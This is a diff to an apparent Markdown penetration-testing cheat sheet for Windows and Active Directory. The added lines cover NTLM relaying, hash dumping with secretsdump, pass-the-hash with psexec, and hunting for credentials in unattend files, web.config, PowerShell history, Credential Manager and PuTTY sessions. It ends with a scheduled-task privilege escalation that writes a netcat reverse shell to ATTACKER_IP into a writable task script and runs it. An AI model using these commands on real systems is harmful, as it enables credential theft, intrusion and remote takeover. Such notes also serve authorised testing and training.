@@ -250,6 +250,7 @@ PS> powershell -nop -c "powershell command; powershell command...;"
 PS> powershell -command "Start-Process -Verb runas cmd"
 # check user
 PS> whoami /user
+PS> whoami /priv
 # check OS
 PS> wmic os list brief
 # check Windows Version
@@ -677,21 +678,26 @@ $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
 # -> Hashcat
 ```
+## ntlmrelayx.py
+```zsh
+$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
+```
+## smbserver.py
+```zsh
+$ smbserver.py -smb2support -username TestUser -password TestPassword TestRemoteAppearFolder TestLocalDirectory
+```
 ## secretsdump.py
 ```zsh
 $ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
 $ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ secretsdump.py -sam sam.hive -system system.hive LOCAL
 $ ls hoge-com_hashes*
-```
-```
-## ntlmrelayx.py
-```zsh
-$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
 ```
 ## psexec.py
 tag: shell
 ```zsh
 $ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
+$ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
 ```
 
 # Evil-WinRM
@@ -775,4 +781,39 @@ PS> Get-Content .\cert_templates.txt -Raw `
 | Select-String -Pattern "Template\[.*?\].*?(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
 | Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
 | Foreach-Object {$_ -replace "aaaa", "`n"}
+```
+
+# config
+```zsh
+# unattended installations on Windows
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+# IIS
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+```zsh
+# Powershell
+cmd> cmdtype %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+PS > Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+# Credential Manager
+cmd> cmdkey /list
+cmd> runas /savecred /user:admin cmd.exe
+cmd> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+# PuTTy
+PS > reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+```zsh
+cmd> schtasks /query /tn TestVulnTask /fo list /v
+cmd> icacls c:\TestTasks\TestSchTask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+                    
+cmd> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > c:\TestTasks\TestSchTask.bat
+Attacker Linux Machine> nc -lvp 4444
+C:\> schtasks /run /tn TestVulnTask
 ```
